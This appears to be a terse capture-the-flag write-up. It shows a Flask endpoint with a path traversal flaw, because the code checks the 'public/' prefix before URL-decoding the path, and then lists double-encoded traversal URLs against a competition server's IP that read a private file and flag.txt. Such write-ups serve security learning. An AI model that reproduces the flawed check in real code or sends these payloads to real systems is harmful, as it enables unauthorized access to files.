```python
@app.get('/api/read/<path:name>')
def readNovel(name):
    name = unquote(name)
    if(not name.startswith('public/')):
        return {'success': False, 'msg': 'You can only read public novels!'}, 400
    buf = readFile(name).split(' ')
    buf = ' '.join(buf[0:session['words_balance']])+'... Charge your account to unlock more of the novel!'
    return {'success': True, 'msg': buf}
```

```public/../private/A-Secret-Tale.txt```

```http://3.64.250.135:9000/api/read/public%2F%2E%2E%2Fprivate%2FA%2DSecret%2DTale%2Etxt```

```http://3.64.250.135:9000/api/read/public%252F%252E%252E%252Fprivate%252FA%252DSecret%252DTale%252Etxt```

```http://3.64.250.135:9000/api/read/public%252F%252E%252E%252F%252E%252E%252Fflag%252Etxt```

MAPNA{uhhh-1-7h1nk-1-f0r607-70-ch3ck-cr3d17>0-4b331d4b}
